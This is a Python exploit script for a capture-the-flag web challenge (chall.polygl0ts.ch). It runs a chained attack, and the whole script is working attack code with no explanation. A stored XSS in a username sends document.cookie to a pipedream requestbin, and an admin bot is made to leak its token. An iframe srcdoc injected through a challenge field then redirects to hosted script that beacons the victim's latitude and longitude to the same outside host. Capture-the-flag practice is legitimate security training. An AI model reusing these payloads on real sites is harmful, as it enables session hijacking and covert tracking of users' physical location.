import sys
sys.path.append('../')

import WebUtils
from WebUtils.HTTPSync import *
from WebUtils.HTTPHost import https_host
from WebUtils.JSCore import js_encodeURIComponent as encodeURIComponent, he_encode
from http.cookies import SimpleCookie
import re
from time import sleep

WebUtils.setHTTPBaseURL("https://chall.polygl0ts.ch:9011")
# WebUtils.setHTTPBaseURL("http://localhost:9011")

# res = get("/register")
# token = res.cookies['token']
token = "1048ff1a0c075060d3ede382ba685f28"
cookies = {
    "token": token
}
print(cookies)

xss = encodeURIComponent(""" 
<script>
navigator.sendBeacon(`https://enbit6i3l2ra4.x.pipedream.net`, document.cookie);
</script>
""".replace('\n', ''))
leak_token_url = f"http://{xss}:pw@chall.polygl0ts.ch:9009/"

username_payload = f"""<a href="{leak_token_url}">Click here to play!</a>"""
print(username_payload)
post("/updateUser", json={
    "username": username_payload
}, cookies=cookies)

res = post('/createChallenge', json={
    "latitude": "1.0",
    "longitude": "1.0",
    "img": "AAAA"
}, cookies=cookies)

chalId = res.text.replace("\"", '')

res = get("/register")
token = res.cookies['token']
cookies_clean = {
    "token" : token
}
print(f"LOGIN TOKEN = {token}")
print("Go to the website and login using this token.")
print("After this, wait to recieve the admin username and paste when prompted.")
input("Enter to continue.")

_html = get("/", cookies=cookies_clean).text
username_clean = re.search("<p>Hello (.*?)</p>", _html).group(1)
print(username_clean)

get("/bot", params={
    "username": username_clean
})

admin_username = input("Admin Username: ").replace(' ', '')

res = post('/challengeUser', json={
    "username" : admin_username,
    "duelID" : chalId
}, cookies=cookies)

print("Now look at requestbin, you should have admin token...")
admin_token = input("Admin token: ")
cookies = {
    "token" : admin_token
}

src_html = """
<body>
<script>
navigator.geolocation.getCurrentPosition((d)=>navigator.sendBeacon('https://enbit6i3l2ra4.x.pipedream.net/', "latitude: " + d.coords.latitude.toString()),(err)=>console.error(err), {'enableHighAccuracy':true});
navigator.geolocation.getCurrentPosition((d)=>navigator.sendBeacon('https://enbit6i3l2ra4.x.pipedream.net/', "longitude: " + d.coords.longitude.toString()),(err)=>console.error(err), {'enableHighAccuracy':true});    
</script>
</body>
"""

# host payload
main_payload_url = https_host(src_html)

inner_srcdoc = he_encode("""
<head>
    <meta http-equiv="refresh" content="0; url=""" + main_payload_url + """">
</head>
""", {
  'encodeEverything': True
})
                     
iframe_inject = """
" srcdoc='""" + inner_srcdoc + """' allow='geolocation *'
""".replace('\n', '')

res = post('/createChallenge', json={
    "latitude": "1.0",
    "longitude": "1.0",
    "img": "AAAA",
    "winText": "asdf",
    "OpenLayersVersion": iframe_inject
}, cookies=cookies)

chalIdPayload = res.text.replace("\"", '')

input("MAKE SURE LOGGED INTO ADMIN ACC NOW")
get("/bot", params={
    "username": admin_username
})

new_admin_username = input("Admin Username: ").replace(' ', '')

res = post('/challengeUser', json={
    "username" : new_admin_username,
    "duelID" : chalIdPayload
}, cookies=cookies)

print("Now look at requestbin, you should have admin token...")